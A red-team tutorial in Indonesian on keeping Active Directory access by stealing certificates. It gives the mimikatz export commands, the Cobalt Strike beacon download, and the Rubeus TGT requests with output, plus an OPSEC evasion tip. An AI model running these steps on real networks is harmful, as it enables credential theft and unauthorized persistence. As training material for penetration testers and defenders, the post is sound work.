---
title: '[AD CS] User & Computer Persistence'
date: 2023-08-02 03:23:22 +0700
categories: ['Active Directory', 'Post Compromise Attack']
tags: [red team, introduction, what is, active directory hacking, windows hacking, post compromise attack, ad cs, persistence]     # TAG names should always be lowercase
author: nairpaa
---


Salah satu fungsi sertifikat yaitu digunakan untuk mengidentifikasi dan mengotentikasi pengguna dan komputer dalam jaringan. 

Berbeda dengan password yang mungkin perlu diubah secara berkala, sertifikat biasanya memiliki masa berlaku yang lebih lama. Ini menjadikannya alat yang berguna untuk mempertahankan akses yang persisten.

```
CA Name             : dc-2.dev.example.io\sub-ca
Template Name       : User
Schema Version      : 1
Validity Period     : 1 year
```

Sertifikat hanya akan menjadi tidak valid jika dicabut oleh *Certificate Authority* (CA) atau jika telah kedaluwarsa.

Proses penerbitan dan penggunaan sertifikat ini tidak harus bergantung pada template yang rentan. Kita bisa mengekstrak sertifikat yang sudah diterbitkan, atau meminta yang baru.

## 0x1 - Exploitation Stages

### Method 1: User Persistence

#### Step 1: Enumerate User Certificates 

Sertifikat pengguna yang telah diterbitkan dapat ditemukan di penyimpanan **Personal Certificate store**.

![Personal Certificate Store](/assets/img/posts/ad-cs-user-and-computer-persistence/1.png)
_Personal Certificate Store_

Kita juga dapat melihat sertifikatnya dengan Seatbelt.

```powershell
PS > .\Seatbelt.exe Certificates

  StoreLocation      : CurrentUser
  Issuer             : CN=sub-ca, DC=dev, DC=example, DC=io
  Subject            : E=namina@example.io, CN=Nana Mina, CN=Users, DC=dev, DC=example, DC=io
  ValidDate          : 9/7/2022 11:44:35 AM
  ExpiryDate         : 9/7/2023 11:44:35 AM
  HasPrivateKey      : True
  KeyExportable      : True
  Thumbprint         : 43FA3C3AE4E1212A3F888937745C2E2F55BAC1B5
  Template           : User
  EnhancedKeyUsages  :
       Encrypting File System
       Secure Email
       Client Authentication     [!] Certificate is used for client authentication!
```

> Selalu pastikan sertifikat digunakan untuk autentikasi klien.
{: .prompt-warning }

#### Step 2: Extract the Certificate

```bash
# Ekstrak sertifikat
beacon> mimikatz crypto::certificates /export

    Public export  : OK - 'CURRENT_USER_My_0_Nana Lamb.der'
    Private export : OK - 'CURRENT_USER_My_0_Nana Lamb.pfx'


# Download sertifikat
beacon> download CURRENT_USER_My_0_Nana Mina.pfx
```

> Buka **View > Downloads**  untuk menyinkronkan file dari Cobalt Strike ke mesin lokal Anda.
{: .prompt-info }

![Download File Pada Cobalt Strike](/assets/img/posts/ad-cs-user-and-computer-persistence/2.png)
_Download File Pada Cobalt Strike_

```bash
# Encode .pfx ke base64
➜ cat CURRENT_USER_My_0_Nana\ Mina.pfx | base64 -w 0
```

```powershell
# Ekstrak TGT
PS > .\Rubeus.exe asktgt /user:namina /certificate:MIINeg[...]IH0A== /password:mimikatz /nowrap
```


> **OPSEC**
> 
> Proses ekstrak TGT ini akan meminta tiket RC4 secara default. Kita dapat memaksa penggunaan AES256 dengan menyertakan parameter `/enctype:aes256`.
{: .prompt-danger }

> Jika pengguna tidak memiliki sertifikat di *store*-nya, kita bisa memintanya dengan Certify.
> 
> ```powershell
> PS > .\Certify.exe request /ca:dc-2.dev.example.io\sub-ca /template:User
> ```
{: .prompt-tip }

### Method 2: Comptuer Persistence

![Computer Certificate Store](/assets/img/posts/ad-cs-user-and-computer-persistence/1.png)
_Computer Certificate Store_

#### Step 1: Enumerate Computer Certificates 

```bash
# Ekstrak sertifikat
beacon> mimikatz !crypto::certificates /systemstore:local_machine /export

    Public export  : OK - 'local_machine_My_0_wkstn-1.dev.example.io.der'
    Private export : OK - 'local_machine_My_0_wkstn-1.dev.example.io.pfx'

# Download sertifikat
beacon> download local_machine_My_0_wkstn-1.dev.example.io.pfx
```

```bash
# Encode .pfx ke base64
➜ cat local_machine_My_0_wkstn-1.dev.example.io.pfx | base64 -w 0
```

```powershell
# Ekstrak TGT
PS > .\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIINCA[...]IH0A== /password:mimikatz /nowrap

[*] Action: Ask TGT

[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=wkstn-1.dev.example.io 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.example.io\WKSTN-1$'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

    doIGYD[...]5pbw==

  ServiceName              :  krbtgt/dev.example.io
  ServiceRealm             :  DEV.EXAMPLE.IO
  UserName                 :  WKSTN-1$
  UserRealm                :  DEV.EXAMPLE.IO
  StartTime                :  9/7/2022 12:06:02 PM
  EndTime                  :  9/7/2022 10:06:02 PM
  RenewTill                :  9/14/2022 12:06:02 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  6DV6vQB5lRoCz84qmRqt0X6UdIzzdQiX+y0IwwDrHlc=
  ASREP (key)              :  C1B715AF5F9B5468EB5FA8ADDA0E02EE2D7548F439DEA5A5D9B4F7DFA6482BDF
```

> Jika pengguna tidak memiliki sertifikat di *store*-nya, kita bisa memintanya dengan Certify.
> 
> ```powershell
> PS > .\Certify.exe request /ca:dc-2.dev.example.io\sub-ca /template:Machine /machine
> ```
{: .prompt-tip }

---

## 0x3 - References

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-persistence
- https://pentestlab.blog/2021/09/13/account-persistence-certificates/